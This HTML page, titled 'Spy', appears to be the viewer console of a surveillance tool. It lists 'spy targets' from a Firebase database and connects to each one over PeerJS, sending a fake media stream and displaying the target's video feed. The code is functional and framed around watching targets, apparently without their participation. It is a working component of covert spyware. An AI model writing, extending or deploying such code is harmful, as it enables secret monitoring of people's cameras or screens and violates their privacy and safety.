<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Spy</title>

    <script src="https://unpkg.com/peerjs@1.3.2/dist/peerjs.min.js"></script>
    <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>

    <script src="utils.js"></script>
</head>

<body>
    <video id="video" controls autoplay></video>
    <button id="btn-endcall">End Call</button>
    <ul id="list-spy-targets"></ul>

    <script type="module">
        import { onSpyTargetsPeerIDChanged, onValue, spyTargetsRef } from './firebase.js';

        onValue(spyTargetsRef, (snapshot) => {
            const data = snapshot.val();

            console.log(data);

            const ul = document.querySelector("#list-spy-targets");
            ul.innerHTML = data ? Object.keys(data).map(peerid => `<li>
                ${data[peerid].name} (${data[peerid].joinedAt})
                <button onclick="call('${peerid}')">Call</button>
            </li>`).join('') : "";
        });

        var videoEle = document.querySelector("#video");
        var btnEndCall = document.querySelector("#btn-endcall");

        var peer = new Peer();
        var currentCall;

        function call(peerid) {
            endCall();

            currentCall = peer.connect(peerid);

            currentCall.on('open', function () {
                console.log('Connected to: ' + peerid);

                var call = peer.call(peerid, createMediaStreamFake());
                call.on('stream', function (remoteStream) {
                    console.log(remoteStream);
                    videoEle.srcObject = remoteStream;
                });
            });
        }

        function endCall() {
            if(currentCall) {
                currentCall.close();
                currentCall = null;
                videoEle.srcObject = null;
            }
        }

        window.onload = () => {
            window.call = call;

            btnEndCall.addEventListener('click', endCall);
        }
    </script>
</body>

</html>